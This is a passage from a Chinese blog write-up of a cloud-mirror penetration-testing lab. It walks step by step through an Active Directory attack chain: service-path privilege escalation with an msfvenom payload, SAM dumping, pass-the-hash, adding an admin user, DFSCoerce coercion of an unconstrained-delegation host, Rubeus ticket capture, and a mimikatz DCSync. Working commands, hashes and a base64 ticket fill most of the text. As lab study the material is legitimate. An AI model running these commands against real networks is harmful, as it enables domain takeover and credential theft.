</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/exec <span class=nv>cmd</span><span class=o>=</span><span class=s1>&#39;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#39;</span> --platform windows -f exe-service &gt; a.exe
</span></span></code></pre></td></tr></table></div></div><p>修改<code>gupdate</code>服务的<code>ImagePath</code>，指向恶意文件，进行更新，成功提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reg add <span class=s2>&#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class=s2>&#34;C:\Users\Adrian\Desktop\a.exe&#34;</span> /f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sc start gupdate
</span></span></code></pre></td></tr></table></div></div><p>解析sam成hash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-secretsdump LOCAL -sam sam -security security -system system
</span></span></code></pre></td></tr></table></div></div><p>再进行hash传递攻击</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45 -codec gbk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag
</span></span><span class=line><span class=cl><span class=nb>type</span> flag02.txt
</span></span></code></pre></td></tr></table></div></div><h2 id=flag3flag4>flag3&&amp;flag4</h2><p>有了机器用户hash，他也是个域用户，进行域内信息收集</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodhound-python -u win19$ --hashes <span class=s2>&#34;:c03ae7549a98c76891362e156c920bf5&#34;</span> -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip
</span></span></code></pre></td></tr></table></div></div><p>也可以弹出终端来收集，都行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>net user test1 baozongwi123! /add
</span></span><span class=line><span class=cl>net localgroup administrators test1 /add
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>privilege::debug
</span></span><span class=line><span class=cl>sekurlsa::pth /user:win19$ /domain:XIAORANG.LAB /ntlm:c03ae7549a98c76891362e156c920bf5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>net user /domain
</span></span></code></pre></td></tr></table></div></div><p>现在控下了win19这台机器，</p><p><img src=/p/springautumn-cloudmirror--delegation/8.png width=807 height=624 srcset="/p/springautumn-cloudmirror--delegation/8_hu_9c1c249a7ba51114.png 480w, /p/springautumn-cloudmirror--delegation/8_hu_4ab862887b7ad885.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=129 data-flex-basis=310px></p><blockquote><p>The computer WIN19.XIAORANG.LAB is configured with Kerberos unconstrained delegation.computerWIN19.XIAORANG.LAB 配置了 Kerberos 不受约束的委派。Users and computers authenticating against WIN19.XIAORANG.LAB will have their Kerberos TGT sent to WIN19.XIAORANG.LAB, unless they are marked as sensitive or members of Protected Users.根据 WIN19 进行身份验证的用户和计算机。小让.LAB 会将其 Kerberos TGT 发送到 WIN19.XIAORANG.LAB，除非它们被标记为敏感用户或受保护用户的成员。An attacker with control over WIN19.XIAORANG.LAB can coerce a Tier Zero computer (e.g. DC) to authenticate against WIN19.XIAORANG.LAB and obtain the target&rsquo;s TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. 控制 WIN19 的攻击者。小让.LAB 可以强制零级计算机（例如 DC）对 WIN19 进行身份验证。小让.LAB 并获取目标的 TGT。借助 DC 的 TGT，攻击者可以执行 DCSync 来破坏域。所以我们强制认证去打这个非约束委派就行了</p></blockquote><p>所以现在需要找一个合适的强制认证就可以了，用<code>netexec</code>扫出来<strong>DFSCoerce</strong>，可以进行Kerberos票据劫持</p><p><a class=link href=https://github.com/Wh04m1001/DFSCoerce target=_blank rel=noopener>https://github.com/Wh04m1001/DFSCoerce</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 dfscoerce.py -u <span class=s2>&#34;WIN19</span>$<span class=s2>&#34;</span> -hashes <span class=s2>&#34;:c03ae7549a98c76891362e156c920bf5&#34;</span> -d xiaorang.lab win19 172.22.4.7
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror--delegation/9.png width=1120 height=214 srcset="/p/springautumn-cloudmirror--delegation/9_hu_a128df8a37fb07a2.png 480w, /p/springautumn-cloudmirror--delegation/9_hu_78d4bab362ea9951.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=523 data-flex-basis=1256px></p><p>过一会就能监听到TGT</p><p><img src=/p/springautumn-cloudmirror--delegation/10.png width=1484 height=866 srcset="/p/springautumn-cloudmirror--delegation/10_hu_1f5c6de499723426.png 480w, /p/springautumn-cloudmirror--delegation/10_hu_87de5ca107e7b37c.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=171 data-flex-basis=411px></p><p>票据保存为kirbi文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD47upeL33nWPkAGhnK3M5xGiy2PjlAMrPiyiFuyYXJW+3zXpEi38/RsBrfgOS+h475e1uAiJdippHw+EpfX5vL42XglTa3Wo4ppajIlgeHtmhcMxmXiu2zLgr4Eyg7zMUf8j8IJ5zli+fUUVrvGUxDaiIKn7inLQRK4hA1KPr6B+7Ym+iT9nJBPwunCGUWfJMyWYAsaGbGrgYM+qtQG1FmlG7nyI13tfrJ1HCl8mdiYeirA+EPTs2/fA6HO4VsNADV2t8OQh2TBGTrNGSR/KMCgSsfbn9BKy5b1EttSGfMO1FsseNkkfJHG2scVUkeOe3X+jKIQilPgQTuqeIJP9pVklCJa7ZEf0aMpaB7dK/FTRJDsEdNq7lNEQ07DYfJKyPSkF3N6vL9Ol+GO+XF4q91T+JqMoHEdERUQc02UijqqTZnWDl0MPQzaCtKyOXByvhcQER+O/RhpPXoxsGRn5wcZ9WLwp+EL0h2a3KiXcY8olsz3pKQI7V76Ihc/+1vaAiccz1lYMydKLOBdk2XnHbteTprA3kdt5ZJKimLhytD7CzxUYyOP2vCPqiT22KoqKmfMK6XFI4wOPtZYscvSKP5xD5fz3yGVlPbvUaFU/xKUMldTyk94WiqBQ9iEt9VN/mS2Yh9i1+DASQRIwSMlo28QOqhOGpjrdjfdHdVYJg7xypUvEeEw8jnTGHyCW2VAQ3UZGFg2wIVHl/hUjJEY60ipIAkopxv3PrODhHHdRRFVOrLOvTsSb/8oPBI3pxkHfl+zP0VmSEffE2HnHR9W5+NGUAZwFwty5MrxQDhucTTapf26TU0fYojBkMqqr6nDA5iSqbPhRgYrFgjOsfa9JXXWc7ZL8VYfia5Ka0hGLH0TeEUYq+Ix2EXln3mXZ+8ketBZna2Yuy/QPufaJMNrXiERdKO3T8ASbyY4nTXq4FfSH8wlpuX2/g0fUCGs8/nQmVZDxJDtSI2gp7sMv0Nl/m+R1c7aaH/P3HWsVIhFe3P05h5/8HUUxSBA8HfvFwqXlcPhTzDPHrL1oTmbwnipK6SBNdjxIGgGftR7xLn62g8311TcVzoTsVV0/guxdc0plVB9DYeaKfxB7tErKrLZGM8YXqekLSU3yVyFoJRHUxjPvvmqZQBfTx+nvDW26mK4ngRNLN8JJ4/Vy7Y5AcBOskP+UpAU449IEc46pLOheGvKca7CfGN1gPY8JULIkfrPLqPuTnkVp5SDV7oXrU91AkBdnl1wi7ghgWUZVR2gEe7eK4ks7xXkce8UDx5sJXmCV22SFQFRi1B/yVqfGHtR8HWCAkexEV3F7ojvGDRWybpIN308HkpRRRyJhnGAnwhtiV7+0T+6xsqr32SUv0wO3cUyt67NEPE+Ik1uxDr2TLjKnfHgwsLtON1jvurAdI9sul2MfZiYSY6FbzL4j4he27iNmhnZ8pGF/6PMxEFCj7GjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDxcX3ziV4cKd38EPGQd902phcV20wJ4BUJY9jgf5to66EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDYxOTA0NDkzN1qmERgPMjAyNTA2MTkxNDQ5MzdapxEYDzIwMjUwNjI2MDQ0OTM3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg<span class=o>==</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD47upeL33nWPkAGhnK3M5xGiy2PjlAMrPiyiFuyYXJW+3zXpEi38/RsBrfgOS+h475e1uAiJdippHw+EpfX5vL42XglTa3Wo4ppajIlgeHtmhcMxmXiu2zLgr4Eyg7zMUf8j8IJ5zli+fUUVrvGUxDaiIKn7inLQRK4hA1KPr6B+7Ym+iT9nJBPwunCGUWfJMyWYAsaGbGrgYM+qtQG1FmlG7nyI13tfrJ1HCl8mdiYeirA+EPTs2/fA6HO4VsNADV2t8OQh2TBGTrNGSR/KMCgSsfbn9BKy5b1EttSGfMO1FsseNkkfJHG2scVUkeOe3X+jKIQilPgQTuqeIJP9pVklCJa7ZEf0aMpaB7dK/FTRJDsEdNq7lNEQ07DYfJKyPSkF3N6vL9Ol+GO+XF4q91T+JqMoHEdERUQc02UijqqTZnWDl0MPQzaCtKyOXByvhcQER+O/RhpPXoxsGRn5wcZ9WLwp+EL0h2a3KiXcY8olsz3pKQI7V76Ihc/+1vaAiccz1lYMydKLOBdk2XnHbteTprA3kdt5ZJKimLhytD7CzxUYyOP2vCPqiT22KoqKmfMK6XFI4wOPtZYscvSKP5xD5fz3yGVlPbvUaFU/xKUMldTyk94WiqBQ9iEt9VN/mS2Yh9i1+DASQRIwSMlo28QOqhOGpjrdjfdHdVYJg7xypUvEeEw8jnTGHyCW2VAQ3UZGFg2wIVHl/hUjJEY60ipIAkopxv3PrODhHHdRRFVOrLOvTsSb/8oPBI3pxkHfl+zP0VmSEffE2HnHR9W5+NGUAZwFwty5MrxQDhucTTapf26TU0fYojBkMqqr6nDA5iSqbPhRgYrFgjOsfa9JXXWc7ZL8VYfia5Ka0hGLH0TeEUYq+Ix2EXln3mXZ+8ketBZna2Yuy/QPufaJMNrXiERdKO3T8ASbyY4nTXq4FfSH8wlpuX2/g0fUCGs8/nQmVZDxJDtSI2gp7sMv0Nl/m+R1c7aaH/P3HWsVIhFe3P05h5/8HUUxSBA8HfvFwqXlcPhTzDPHrL1oTmbwnipK6SBNdjxIGgGftR7xLn62g8311TcVzoTsVV0/guxdc0plVB9DYeaKfxB7tErKrLZGM8YXqekLSU3yVyFoJRHUxjPvvmqZQBfTx+nvDW26mK4ngRNLN8JJ4/Vy7Y5AcBOskP+UpAU449IEc46pLOheGvKca7CfGN1gPY8JULIkfrPLqPuTnkVp5SDV7oXrU91AkBdnl1wi7ghgWUZVR2gEe7eK4ks7xXkce8UDx5sJXmCV22SFQFRi1B/yVqfGHtR8HWCAkexEV3F7ojvGDRWybpIN308HkpRRRyJhnGAnwhtiV7+0T+6xsqr32SUv0wO3cUyt67NEPE+Ik1uxDr2TLjKnfHgwsLtON1jvurAdI9sul2MfZiYSY6FbzL4j4he27iNmhnZ8pGF/6PMxEFCj7GjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDxcX3ziV4cKd38EPGQd902phcV20wJ4BUJY9jgf5to66EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDYxOTA0NDkzN1qmERgPMjAyNTA2MTkxNDQ5MzdapxEYDzIwMjUwNjI2MDQ0OTM3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==&#39;</span> <span class=p>|</span> base64 -d &gt; DC01.kirbi
</span></span></code></pre></td></tr></table></div></div><p>有了域控的凭据，用猕猴桃注入票据，进行DCSync攻击</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\m</span>imikatz.exe <span class=s2>&#34;kerberos::purge&#34;</span> <span class=s2>&#34;kerberos::ptt DC01.kirbi&#34;</span> <span class=s2>&#34;lsadump::dcsync /domain:xiaorang.lab /user:administrator&#34;</span> <span class=s2>&#34;exit&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror--delegation/11.png width=1437 height=734 srcset="/p/springautumn-cloudmirror--delegation/11_hu_de7c37fb73435de2.png 480w, /p/springautumn-cloudmirror--delegation/11_hu_72a8c4f6bd580e23.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=195 data-flex-basis=469px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>4889f6553239ace1f7c47fa2c619c252
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>impacket-psexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag
</span></span><span class=line><span class=cl><span class=nb>type</span> flag03.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>impacket-psexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.7
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag
</span></span><span class=line><span class=cl><span class=nb>type</span> flag04.txt
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pentest/>Pentest</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/springautumn-cloudmirror-time/><div class=article-details><h2 class=article-title>春秋云镜Time</h2></div></a></article><article><a href=/p/spring-autumn-mirror-certify/><div class=article-details><h2 class=article-title>春秋云镜Certify</h2></div></a></article><article><a href=/p/springautumn-cloudmirror-magicrelay/><div class=article-details><h2 class=article-title>春秋云镜MagicRelay</h2></div></a></article><article><a href=/p/springautumn-cloudmirror-brute4road/><div class=article-details><h2 class=article-title>春秋云镜Brute4Road</h2></div></a></article><article><a href=/p/chunqiu-cloud-mirror-tsclient/><div class=article-details><h2 class=article-title>春秋云镜Tsclient</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>